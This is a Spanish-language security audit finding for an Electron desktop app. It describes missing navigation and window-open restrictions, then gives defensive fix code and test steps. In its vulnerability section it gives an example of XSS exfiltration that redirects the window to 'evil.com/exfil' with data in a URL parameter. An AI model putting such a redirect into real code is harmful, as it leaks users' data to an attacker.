# SEC-010 — Sin lockdown de navegación (`will-navigate` / `setWindowOpenHandler`)

- **Severidad:** P2 (Media)
- **Categoría:** Configuration (CWE-1021: restricciones insuficientes en navegación)
- **Archivos afectados:** `electron/window-manager.js` (ausente)

## Vulnerabilidad

`window-manager.js` crea la `BrowserWindow` y setea CSP vía `onHeadersReceived`, pero **no** registra:
- `mainWindow.webContents.on('will-navigate', ...)` para bloquear navegación top-level fuera del archivo de la app.
- `mainWindow.setWindowOpenHandler(...)` para decidir qué hacer con `window.open()` / `target=_blank`.

CSP (`default-src 'self'`, `connect-src 'self' https://*.supabase.co`) **no** gobierna la navegación top-level (no hay `navigate-to`/`form-action` restrictivos). Así, un renderer comprometido (XSS) podría hacer `window.location.href = 'https://evil.com/exfil?d=...'` y navegar la ventana principal a un origen atacante (perdiendo el origin `file://` y el acceso a `localStorage` propio, pero permitiendo exfiltrar por URL param o phish dentro de la ventana de la app), o `window.open('https://evil.com')` para abrir una nueva ventana.

## Impacto

No es RCE. Permite, dado renderer comprometido: (a) redirigir la ventana de la app a un sitio atacante (exfiltración por URL, phishing que se ve "dentro" de la ventana frameless de Antares), (b) abrir ventanas externas, (c) escapar del origen `file://` para cargar contenido arbitrario. P2 (prerrequisito XSS, pero fácil de prevenir y barato de fixear).

## Fix propuesto (aditivo, conserva la funcionalidad)

En `createWindow`, después de crear `mainWindow` (antes o después del bloque CSP, es indiferente):

```js
const mainWindow = new BrowserWindow({ /* ... existente ... */ });

// --- Navegación: bloquear cualquier navegación top-level que no sea el
// archivo local de la app. El renderer no debería navegar a URLs externas.
const allowedLoadUrl = isDev
  ? 'http://localhost:5173'
  : pathToFileURL(htmlPath).toString();   // requerir 'url' arriba

mainWindow.webContents.on('will-navigate', (event, url) => {
  if (url === allowedLoadUrl || url.startsWith(allowedLoadUrl)) return;
  event.preventDefault();
  console.warn('[window-manager] Navegación bloqueada:', url);
});

// --- Nuevas ventanas: denegar por defecto. Los links externos legítimos
// (p.ej. "Ayuda") deben abrirse vía shell.openExternal con URL validada,
// no vía window.open en el renderer.
mainWindow.setWindowOpenHandler(({ url }) => {
  // Si la app abre links externos intencionalmente, manejarlos con
  // shell.openExternal + allowlist de scheme/host en lugar de allow aquí.
  console.warn('[window-manager] window.open bloqueado:', url);
  return { action: 'deny' };
});

// Defender contra webview embedding (no se usan webviews hoy, belt-and-suspenders).
mainWindow.webContents.on('will-attach-webview', (event, webPreferences) => {
  delete webPreferences.preload;
  webPreferences.nodeIntegration = false;
  webPreferences.contextIsolation = true;
});
```

> Conserva toda la funcionalidad: la app carga su `index.html` (`loadFile`) / `localhost:5173` (dev) que son `allowedLoadUrl` → no se bloquea. Si la app tiene links externos intencionales (p.ej. repositorio GitHub en Ayuda), esos deben exponerse como un método IPC nativo que use `shell.openExternal` con validación de scheme (`https:`) — no via `window.open` del renderer. Si hoy no hay `window.open` en el renderer (verificar con grep), denegar es 100% seguro.

## Testing (sin romper nada)

1. **`tests/test-electron-preload.js` / nuevo `test-electron-navigation.js`:** mockear `webContents` y verificar:
   - `will-navigate` con `allowedLoadUrl` → no se llama `preventDefault`.
   - `will-navigate` con `https://evil.com` → `preventDefault` llamado.
   - `setWindowOpenHandler({ url: 'https://evil.com' })` → `{ action: 'deny' }`.
2. **Smoke `npm run dev`:** la app carga normal; navegar internamente (router SPA) no dispara `will-navigate` (es navegación del history de la SPA, no top-level) → sin impacto.
3. **`npm run build:win` + run:** `loadFile` carga `index.html` → `allowedLoadUrl` coincide → OK.
4. Grep `frontend/src` por `window.open(` — si hay usos legítimos, moverlos a `shell.openExternal` con allowlist antes de activar el deny; si no hay, deny directo.
